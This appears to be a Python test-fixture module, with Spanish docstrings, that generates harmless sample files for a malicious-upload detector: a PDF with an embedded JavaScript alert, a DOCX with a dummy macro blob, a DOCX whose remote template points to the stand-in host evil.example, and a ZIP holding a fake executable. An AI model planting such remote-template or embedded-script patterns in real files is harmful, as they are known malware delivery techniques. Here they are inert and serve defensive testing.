"""Archivos de muestra generados en memoria (ninguno contiene malware real)."""

from __future__ import annotations

import io
import zipfile


def pdf(texto: str = 'La normalizacion de bases de datos evita la redundancia de datos.', extra: bytes = b'') -> bytes:
    """PDF mínimo válido con una página de texto (pypdf puede leerlo)."""
    contenido = f'BT /F1 12 Tf 72 720 Td ({texto}) Tj ET'.encode('latin-1')
    objetos = [
        b'<< /Type /Catalog /Pages 2 0 R >>',
        b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
        b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R '
        b'/Resources << /Font << /F1 5 0 R >> >> >>',
        b'<< /Length ' + str(len(contenido)).encode() + b' >>\nstream\n' + contenido + b'\nendstream',
        b'<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
    ]
    if extra:
        objetos.append(extra)
    salida = io.BytesIO()
    salida.write(b'%PDF-1.4\n')
    offsets = []
    for i, obj in enumerate(objetos, 1):
        offsets.append(salida.tell())
        salida.write(f'{i} 0 obj\n'.encode() + obj + b'\nendobj\n')
    xref = salida.tell()
    salida.write(f'xref\n0 {len(objetos) + 1}\n0000000000 65535 f \n'.encode())
    for off in offsets:
        salida.write(f'{off:010d} 00000 n \n'.encode())
    salida.write(f'trailer\n<< /Size {len(objetos) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n'.encode())
    return salida.getvalue()


def pdf_with_javascript() -> bytes:
    return pdf(extra=b'<< /S /JavaScript /JS (app.alert\\(1\\)) >>')


def docx(texto: str = 'Apuntes de calculo diferencial: la derivada mide la razon de cambio.') -> bytes:
    import docx as python_docx
    doc = python_docx.Document()
    doc.add_paragraph(texto)
    salida = io.BytesIO()
    doc.save(salida)
    return salida.getvalue()


def docx_with_macro() -> bytes:
    salida = io.BytesIO()
    with zipfile.ZipFile(salida, 'w') as z:
        z.writestr('[Content_Types].xml', '<Types/>')
        z.writestr('word/document.xml', '<w:document/>')
        z.writestr('word/vbaProject.bin', b'\x00' * 64)
    return salida.getvalue()


def docx_remote_template() -> bytes:
    salida = io.BytesIO()
    with zipfile.ZipFile(salida, 'w') as z:
        z.writestr('[Content_Types].xml', '<Types/>')
        z.writestr('word/document.xml', '<w:document/>')
        z.writestr('word/_rels/settings.xml.rels',
                   '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
                   'officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" '
                   'TargetMode="External"/></Relationships>')
    return salida.getvalue()


def zip_with_exe() -> bytes:
    salida = io.BytesIO()
    with zipfile.ZipFile(salida, 'w') as z:
        z.writestr('tarea/README.txt', 'hola')
        z.writestr('tarea/instalador.exe', b'MZ' + b'\x00' * 100)
    return salida.getvalue()


def fake_exe() -> bytes:
    return b'MZ\x90\x00\x03\x00\x00\x00' + b'\x00' * 200


def png() -> bytes:
    return (b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4'
            b'\x89\x00\x00\x00\rIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82')
